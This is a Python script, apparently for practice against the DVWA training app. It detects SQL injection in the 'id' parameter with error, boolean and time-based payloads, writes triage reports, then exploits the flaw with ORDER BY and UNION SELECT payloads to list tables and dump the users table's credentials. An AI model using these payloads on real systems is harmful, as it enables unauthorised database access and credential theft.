import requests
from bs4 import BeautifulSoup
import argparse

parser = argparse.ArgumentParser(description="Web vulnerability triage tool")
parser.add_argument("url", help="Target base URL, e.g. http://127.0.0.1:8081")
parser.add_argument("--username", default="admin")
parser.add_argument("--password", default="password")
args = parser.parse_args()

BASE_URL = args.url.rstrip("/")
session = requests.Session()

# --- Step 1: Login ---
login_page = session.get(f"{BASE_URL}/login.php")
soup = BeautifulSoup(login_page.text, "html.parser")
csrf_token = soup.find("input", {"name": "user_token"})["value"]

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": csrf_token
}
response = session.post(f"{BASE_URL}/login.php", data=login_data)

print("Login status code:", response.status_code)
print("Login final URL:", response.url)

if "index.php" not in response.url:
    print("!!! Login failed — check if DVWA database needs setup at /setup.php")
    exit()

print("Logged in successfully!\n")

# --- Step 2: Set security level to Low, within this session ---
session.get(f"{BASE_URL}/security.php")
session.post(f"{BASE_URL}/security.php", data={"security": "low", "seclev_submit": "Submit"})
print("Current cookies:", session.cookies.get_dict(), "\n")

# --- Step 3: Parse the SQLi page's form ---
target_page = f"{BASE_URL}/vulnerabilities/sqli/"
page = session.get(target_page)
page_soup = BeautifulSoup(page.text, "html.parser")

forms = page_soup.find_all("form")
print(f"Found {len(forms)} form(s) on {target_page}")
for form in forms:
    action = form.get("action")
    method = form.get("method", "GET").upper()
    inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
    print(f"  Action: {action}, Method: {method}, Inputs: {inputs}")
print()

# --- Step 4: Hidden directory/file discovery ---
wordlist = ["admin", "config", "backup", "uploads", "test", "robots.txt", ".git", "phpinfo.php"]
print(f"Checking for hidden paths on {BASE_URL}")
for word in wordlist:
    url = f"{BASE_URL}/{word}"
    resp = session.get(url, allow_redirects=False)
    if resp.status_code in (200, 403):
        print(f"  [{resp.status_code}] {url}")
print()

# --- Step 5-7 combined: SQLi detection with scoring ---
import time
findings = []

def add_finding(param, technique, confidence, evidence):
    findings.append({
        "param": param,
        "technique": technique,
        "confidence": confidence,
        "evidence": evidence
    })

# Error-based
baseline = session.get(target_page, params={"id": "1", "Submit": "Submit"})
injected = session.get(target_page, params={"id": "1'", "Submit": "Submit"})
if len(baseline.text) != len(injected.text):
    evidence = "Response length changed from error-breaking quote"
    if "sql" in injected.text.lower() or "error" in injected.text.lower():
        add_finding("id", "error-based", "high", evidence + "; SQL error text present")
    else:
        add_finding("id", "error-based", "medium", evidence)

# Boolean-based
true_payload = session.get(target_page, params={"id": "1' AND '1'='1", "Submit": "Submit"})
false_payload = session.get(target_page, params={"id": "1' AND '1'='2", "Submit": "Submit"})
if len(true_payload.text) != len(false_payload.text):
    add_finding("id", "boolean-based", "high",
                f"TRUE length {len(true_payload.text)} vs FALSE length {len(false_payload.text)}")

# Time-based
start = time.time()
session.get(target_page, params={"id": "1' AND SLEEP(3)-- -", "Submit": "Submit"})
elapsed = time.time() - start
if elapsed >= 3:
    add_finding("id", "time-based", "high", f"Response delayed {elapsed:.2f}s on SLEEP(3) payload")

# --- Overall scoring ---
print("\n--- Findings Summary ---")
for f in findings:
    print(f"  [{f['confidence'].upper()}] {f['technique']} on param '{f['param']}': {f['evidence']}")

high_count = sum(1 for f in findings if f["confidence"] == "high")
if high_count >= 2:
    overall = "CONFIRMED"
elif high_count == 1:
    overall = "LIKELY"
elif findings:
    overall = "POSSIBLE"
else:
    overall = "NONE DETECTED"

print(f"\nOverall assessment for param 'id' on {target_page}: {overall}")
print(f"({len(findings)} technique(s) flagged this parameter)")
# --- Step 8: Human verification checklist ---
VERIFICATION_STEPS = {
    "error-based": "Manually browse to the page with a single quote in the parameter and confirm a real DB error renders (not just a generic error page).",
    "boolean-based": "Manually test TRUE vs FALSE payloads in the browser/Burp and visually confirm different content is returned (not just length).",
    "time-based": "Manually resend the SLEEP payload via Burp Repeater and confirm the delay is consistent across 2-3 attempts (rules out network jitter)."
}

print("\n--- Manual Verification Checklist ---")
for f in findings:
    step = VERIFICATION_STEPS.get(f["technique"], "Manually inspect this finding.")
    print(f"  [ ] {f['technique']} on '{f['param']}': {step}")
# --- Step 9: Generate report file ---
import json
from datetime import datetime

report = {
    "target": target_page,
    "scan_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    "hidden_paths_found": [f"{BASE_URL}/{w}" for w in wordlist if session.get(f"{BASE_URL}/{w}", allow_redirects=False).status_code in (200, 403)],
    "findings": findings,
    "overall_assessment": overall,
    "manual_verification_checklist": [
        {"technique": f["technique"], "param": f["param"], "step": VERIFICATION_STEPS.get(f["technique"], "Manually inspect this finding.")}
        for f in findings
    ]
}

with open("report.json", "w") as out:
    json.dump(report, out, indent=2)

print(f"\nReport written to report.json")

# Also generate a readable Markdown version
with open("report.md", "w") as out:
    out.write(f"# Vulnerability Triage Report\n\n")
    out.write(f"**Target:** {target_page}\n\n")
    out.write(f"**Scan date:** {report['scan_date']}\n\n")
    out.write(f"## Findings\n\n")
    for f in findings:
        out.write(f"- **[{f['confidence'].upper()}] {f['technique']}** on param `{f['param']}`: {f['evidence']}\n")
    out.write(f"\n**Overall assessment:** {overall} ({len(findings)} technique(s) flagged)\n\n")
    out.write(f"## Manual Verification Checklist\n\n")
    for f in findings:
        step = VERIFICATION_STEPS.get(f["technique"], "Manually inspect this finding.")
        out.write(f"- [ ] **{f['technique']}** on `{f['param']}`: {step}\n")

print("Report written to report.md")
def find_column_count(session, target_page):
    for i in range(1, 10):
        payload = f"1' ORDER BY {i}-- -"
        resp = session.get(target_page, params={"id": payload, "Submit": "Submit"})
        if "error" in resp.text.lower() or "unknown column" in resp.text.lower():
            return i - 1
    return None

col_count = find_column_count(session, target_page)
print(f"\nColumn count detected: {col_count}")
def find_reflected_columns(session, target_page, col_count):
    # Build a payload like: UNION SELECT 1,2-- -
    col_markers = ",".join(str(i) for i in range(1, col_count + 1))
    payload = f"1' UNION SELECT {col_markers}-- -"
    resp = session.get(target_page, params={"id": payload, "Submit": "Submit"})

    reflected = []
    for i in range(1, col_count + 1):
        if str(i) in resp.text:
            reflected.append(i)
    return reflected, resp.text

reflected_cols, raw_response = find_reflected_columns(session, target_page, col_count)
print(f"Reflected columns: {reflected_cols}")
def get_table_names(session, target_page, reflected_cols):
    col1, col2 = reflected_cols[0], reflected_cols[1]
    payload = f"1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -"
    resp = session.get(target_page, params={"id": payload, "Submit": "Submit"})
    soup = BeautifulSoup(resp.text, "html.parser")
    return resp.text, soup

raw_text, parsed = get_table_names(session, target_page, reflected_cols)
print("\n--- Table enumeration (raw snippet) ---")
# Print the relevant chunk of the page where results usually appear
import re
match = re.search(r'<div class="vulnerable_code_area">(.*?)</div>', raw_text, re.DOTALL)
if match:
    print(BeautifulSoup(match.group(1), "html.parser").get_text(separator="\n", strip=True))
else:
    print(raw_text[:1000])  # fallback: just show a chunk if the expected div isn't found
def dump_users_table(session, target_page):
    payload = "1' UNION SELECT user,password FROM users-- -"
    resp = session.get(target_page, params={"id": payload, "Submit": "Submit"})
    return resp.text

raw_text = dump_users_table(session, target_page)
match = re.search(r'<div class="vulnerable_code_area">(.*?)</div>', raw_text, re.DOTALL)
print("\n--- Extracted users table ---")
if match:
    print(BeautifulSoup(match.group(1), "html.parser").get_text(separator="\n", strip=True))
else:
    print(raw_text[:1000])
